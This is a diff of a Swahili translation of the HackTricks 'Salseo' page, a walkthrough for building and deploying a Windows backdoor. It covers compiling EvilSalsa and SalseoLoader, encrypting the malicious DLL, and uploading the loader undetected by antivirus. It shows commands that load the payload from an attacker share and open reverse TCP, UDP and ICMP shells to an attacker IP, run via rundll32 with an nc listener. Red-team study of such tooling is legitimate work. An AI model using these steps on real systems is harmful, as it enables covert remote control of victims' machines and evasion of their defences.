@@ -1,50 +1,51 @@
 # Salseo
 
+{% hint style="success" %}
+Jifunze na zoea AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na zoea GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Aunga mkono HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## Kukusanya faili za binary
 
-Pakua msimbo wa chanzo kutoka github na kusanya **EvilSalsa** na **SalseoLoader**. Utahitaji **Visual Studio** imewekwa ili kusanya msimbo.
+Pakua msimbo wa chanzo kutoka kwenye github na kusanya **EvilSalsa** na **SalseoLoader**. Utahitaji **Visual Studio** imewekwa ili kusanya msimbo.
 
-Kusanya miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo utazitumia (Ikiwa Windows inaunga mkono x64 kusanya kwa usanifu huo).
+Kusanya miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo utazitumia (Ikiwa Windows inasaidia x64 kusanidi kwa usanifu huo).
 
 Unaweza **kuchagua usanifu** ndani ya Visual Studio kwenye **Tab ya "Kujenga" kushoto** katika **"Lengo la Jukwaa".**
 
-(\*\*Ikiwa huwezi kupata chaguo hili bonyeza **"Tab ya Mradi"** kisha kwenye **"Mali ya \<Jina la Mradi>"**)
+(\*\*Ikiwa huwezi kupata chaguo hili bonyeza **"Tab ya Mradi"** kisha kwenye **"Mali ya <Jina la Mradi>"**)
 
 ![](<../.gitbook/assets/image (132).png>)
 
-Kisha, jenga miradi yote (Kujenga -> Kujenga Suluhisho) (Ndani ya magogo kutatokea njia ya faili ya kutekelezeka):
+Kisha, jenga miradi yote (Kujenga -> Kujenga Suluhisho) (Ndani ya magogo itaonekana njia ya faili ya kutekelezeka):
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
 ## Andaa mlango wa nyuma
 
 Kwanza kabisa, utahitaji kuweka msimbo wa **EvilSalsa.dll.** Kufanya hivyo, unaweza kutumia skripti ya python **encrypterassembly.py** au unaweza kusanya mradi **EncrypterAssembly**:
+
+### **Python**
 ```
 python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
 ### Windows
-
-### Windows
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Sasa una kila kitu unachohitaji kutekeleza kila kitu cha Salseo: **EvilDalsa.dll iliyohifadhiwa** na **binary ya SalseoLoader.**
+Ok, sasa una kila kitu unachohitaji kutekeleza kila kitu cha Salseo: **EvilDalsa.dll iliyohifadhiwa** na **binary ya SalseoLoader.**
 
 **Pakia binary ya SalseoLoader.exe kwenye mashine. Hawapaswi kugunduliwa na AV yoyote...**
 
@@ -64,7 +65,7 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 ```
 ### **Kupata kifaa cha kurudi nyuma cha ICMP (dll iliyosimbwa tayari ndani ya mwathiriwa)**
 
-**Wakati huu unahitaji zana maalum kwenye mteja kupokea kurudi kwa shell. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Wakati huu unahitaji kifaa maalum kwenye mteja kupokea kurudi kwa shell. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Zima Majibu ya ICMP:**
 ```
@@ -95,31 +96,31 @@ Fungua mradi wa SalseoLoader ukitumia Visual Studio.
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Tafuta pakiti ya DllExport (utumie kichupo cha Kutafuta), kisha bonyeza Sakinisha (na ukubali kidirisha cha arifa)**
+#### **Tafuta pakiti ya DllExport (kwa kutumia kichupo cha Kutafuta), na bonyeza Sakinisha (na ukubali kisanduku cha arifa)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 Katika folda yako ya mradi, faili zimeonekana: **DllExport.bat** na **DllExport\_Configure.bat**
 
-### **K**usakinsha DllExport
+### **O**ndoa DllExport
 
-Bonyeza **Sakinsha** (ndio, ni ajabu lakini niamini, ni muhimu)
+Bonyeza **Ondoa** (ndio, ni ajabu lakini niamini, ni muhimu)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### **Toka Visual Studio na tekeleza DllExport\_configure**
+### **Toka** Visual Studio na tekeleza DllExport\_configure
 
 Tu **toka** Visual Studio
 
 Kisha, nenda kwenye **folda yako ya SalseoLoader** na **tekeleza DllExport\_Configure.bat**
 
-Chagua **x64** (ikiwa utaitumia ndani ya sanduku la x64, hilo lilikuwa kesi yangu), chagua **System.Runtime.InteropServices** (ndani ya **Jina la Nafasi kwa DllExport**) na bonyeza **Tumia**
+Chagua **x64** (ikiwa utaitumia ndani ya sanduku la x64, hilo lilikuwa suala langu), chagua **System.Runtime.InteropServices** (ndani ya **Namespace for DllExport**) na bonyeza **Tumia**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
-### **Fungua mradi tena na Visual Studio**
+### **Fungua tena mradi na Visual Studio**
 
-**\[DllExport]** haipaswi tena kuwa na kosa
+**\[DllExport]** haipaswi tena kuwa na alama ya kosa
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
@@ -137,17 +138,17 @@ Kujenga suluhisho: Jenga --> Jenga Suluhisho (Ndani ya konsoli ya matokeo, njia 
 
 ### Jaribu Dll iliyozalishwa
 
-Nakili na ubandike Dll mahali unapotaka kuifanyia majaribio.
+Nakili na ubandike Dll mahali unapotaka kuithibitisha.
 
 Tekeleza:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-Ikiwa hakuna kosa linaonekana, labda una DLL inayofanya kazi!!
+Ikiwa hakuna kosa linaonekana, huenda una DLL inayofanya kazi!!
 
-## Pata shell ukitumia DLL
+## Pata ganda kwa kutumia DLL
 
-Usisahau kutumia **server** ya **HTTP** na weka msikilizaji wa **nc**
+Usisahau kutumia **seva** ya **HTTP** na weka msikilizaji wa **nc**
 
 ### Powershell
 ```
@@ -169,16 +170,17 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
+{% hint style="success" %}
+Jifunze na zoea AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na zoea GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
